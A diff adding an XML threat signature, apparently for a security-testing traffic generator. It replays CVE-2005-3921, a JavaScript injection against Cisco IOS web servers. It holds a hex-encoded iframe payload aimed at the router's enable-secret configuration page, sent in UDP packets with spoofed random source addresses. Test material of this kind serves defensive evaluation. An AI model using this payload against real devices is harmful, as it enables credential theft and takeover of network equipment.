@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco Memory Buffer Javascript Injection"/>
+    <EngDesc display="true" value="This threat allows an attacker to inject arbitrary javascript code in the memory dump pages of cisco equipment with the IOS Web Server enabled.  This allows the user to issue any command available to the web console, including changing passwords and stealing credentials.  This threat is a stateless attack that comes from random source addresses, over UDP ports 53 to 53."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Network"/>
+      <item value="Appliance"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cisco_IOS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cisco_IOS_12.0(2a)"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.infohacking.com/INFOHACKING_RESEARCH/Our_Advisories/cisco/index.html"/>
+    <CVEID display="true" value="CVE-2005-3921"/>
+    <bugtraqID display="true" value="15602"/>
+    <OSVDB display="true" value="21360"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000107fe776dbe00c000a80001003c6d260aeb"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725873656406250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X3C\X69\X66\X72\X61\X6D\X65\X20\X73\X72\X63\X3D\X22\X2E\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2E\X2E\X2F\X2F\X2E\X2E\X2F\X63\X6F\X6E\X66\X69\X67\X75\X72\X65\X2F\X2F\X2F\X2F\X2E\X2E\X2F\X65\X6E\X61\X62\X6C\X65\X2F\X2E\X2F\X2E\X2F\X2F\X2F\X2E\X2E\X2F\X73\X65\X63\X72\X65\X74\X2F\X69\X68\X22\X2E\X2E\X2E\X2E\X0A"/>
+    <Created value="1139461932" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(10,40)" Protocol="11" HeaderChecksum="" srcIP="@random(0.0.0.0,255.255.255.255)" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="53" destPort="$destPort" checksum="" length="" Payload="3C696672616D65207372633D222E2F2E2E2F2E2E2F2E2E2F2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2F2E2E2F636F6E6669677572652F2F2F2F2E2E2F656E61626C652F2E2F2E2F2F2F2E2E2F7365637265742F6968222E2E2E2E0A"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
